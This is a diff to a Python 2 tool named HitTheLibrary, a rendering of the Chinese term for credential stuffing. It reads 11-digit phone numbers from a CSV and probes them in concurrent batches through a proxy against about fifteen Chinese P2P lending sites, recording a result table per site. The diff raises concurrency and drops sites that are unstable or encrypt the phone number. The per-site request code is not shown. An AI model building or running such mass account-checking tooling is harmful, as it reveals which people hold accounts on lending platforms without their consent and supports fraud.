@@ -62,12 +62,13 @@ class HitTheLibrary(object):
     """
 
     def __init__(self, file_name):
-        super(HitTheLibrary, self).__init__()
+        # super(HitTheLibrary, self).__init__()
 
         PROXY_HOST = 'proxy.dianhua.cn'
         # PROXY_HOST = "192.168.20.199"
         self._file_name = file_name
-        self._all_tasks = []
+        self.all_tasks = []
+        self.all_tasks_ok = None
         # PROXY_HOST = "120.92.137.32"
         PROXIES = {'http': 'http://{}:8080'.format(PROXY_HOST),
                    'https': 'http://{}:8080'.format(PROXY_HOST)}
@@ -85,28 +86,25 @@ class HitTheLibrary(object):
             AiQianJin(): "aiqianjin",
             DianRong(): "dianrong",
             MaiDanXia(): "maidanxia",
-            
             RenRenDai(): "renrendai",
-            JiMuHeZi(): "jimuhezi",
+            # JiMuHeZi(): "jimuhezi", # 有问题 无返回, 初步分析手机号存在加密
             # 瑞姐 小贷
             TouNa(): "touna",
             WeiDai(): "weidai",
             XiaoWoJinFu(): "xiaowojinfu",
-            YiDai(): "yidai",
+            # YiDai(): "yidai", # 三次访问，两次返回未知， 不稳定
             YouLi(): "youli",
-            
             YiLongDai(): "yilongdai",
             # 志强 小贷
             Xiaoqian(): "xiaoqian2",
-            Kuaijin(): "kuaijin",
+            # Kuaijin(): "kuaijin",
             Feidai(): "feidai",
-            
             # Songshudai(): "songshudai",
-            Renrendaikuan(): "renrendaikuan",
+            # Renrendaikuan(): "renrendaikuan", # 服务标识为空或服务非法
         }
         self._sites = self._sites_and_sites_names.keys()
         self._sites_table_columns = self._sites_and_sites_names.values()
-        self._step = 1
+        self._step = 10
         self._sleep = 1
 
         self.__run()
@@ -131,6 +129,7 @@ class HitTheLibrary(object):
     def __table(self, phone_numbers):
         pn_list = map(lambda x: str(x.tolist()[0]), phone_numbers.values)
         data = pd.DataFrame(index=pn_list, columns=self._sites_table_columns)
+        print data
         print "总条目数: %d" % len(data.index)
         return data
 
@@ -139,14 +138,17 @@ class HitTheLibrary(object):
 
     def generator_tasks(self, df):
         tasks = [gevent.spawn(self.__core, str(tel_num[0])) for tel_num in df]
-        self._all_tasks.extend(tasks)
-        gevent.joinall(tasks, raise_error=False)
+        self.all_tasks.extend(tasks)
+        print "add: %d" %len(self.all_tasks)
+        self.all_tasks_ok = gevent.joinall(tasks, raise_error=False)
+        print "finish: %d" %len(self.all_tasks_ok)
 
     def __run(self):
         # with pd.ExcelFile(self._file_name) as xls:
         # with pd.ExcelFile('test.xlsx') as xls:
         #     df1 = pd.read_excel(xls, '10w')
         df1 = pd.read_csv(self._file_name, header=0)
+        print "xlliu %d" %len(df1.index)
         #column = u'手机号码'
         column = 'tel'
         # column = u'电话号码'
@@ -154,34 +156,45 @@ class HitTheLibrary(object):
         print df1.columns[0] == column, df1.columns[0]
         print "========================="
         # 测试截取30
-        df1 = df1.loc[:3, [column]]
-        self._TABLE = self.__table(df1)
-        time_num = int(math.ceil(len(df1.index) / self._step))
-        # _pool = multiprocessing.Pool(processes=1)
+        df2 = df1.loc[:, [column]][df1.tel.str.contains(r'^\d{11}$')]
+        self._TABLE = self.__table(df2)
+        time_num = int(math.ceil(len(df2.index) / self._step))
+        # time_num = int(math.ceil(50 / self._step))
+        print "----"
+        print "循环总次数: %d, Table表总长度/并发数: %d/%d" %(time_num, len(df1.index), self._step)
+        print "----"
         # _pool = multiprocessing.Pool()
+        n1 = 0
         _pool = pool.Pool()
         for n in xrange(time_num):
             print str(n * self._step), str((n + 1) * self._step - 1)
-            df2 = df1.loc[n * self._step:(n + 1) * self._step - 1, [column]].values
+            df3 = df2.loc[n * self._step:(n + 1) * self._step - 1, [column]].values
+            n1 += len(df3)
+            print "n1: %d" %n1
             print "===================GoGoGo: %d=====================" % n
             # self.__generator_tasks(df2)
-            _pool.apply_async(self.return_params, args=(df2,), callback=self.generator_tasks)
+            _pool.apply_async(self.return_params, args=(df3,), callback=self.generator_tasks)
             time.sleep(self._sleep)
         # _pool.close()
         # _pool.join()
-        nat = self._all_tasks
+        nat = self.all_tasks
         print "all_tasks: %d" % len(nat)
+        # raise "stop run"
         # 轮询
         n = 0
         while True:
             c = 0
-            for x in self._all_tasks:
+            for x in self.all_tasks:
                 cc = 1 if x.ready() else 0
                 c += cc
             print "读秒次数: %d 已完成: %d/总数: %d " % (n, c, len(nat))
             if c == len(nat):
-                time.sleep(1)
-                self._TABLE.to_csv(path_or_buf="./run_result/%s" % self._file_name.split(r"/")[2], chunksize=1)
+                time.sleep(30)
+                print "write file start"
+                # , chunksize=5000
+                self._TABLE.to_csv(path_or_buf="./run_result/%s" % self._file_name.split(r"/")[2])
+                print "write file finish"
+                print self._TABLE
                 break
             time.sleep(1)
             n += 1
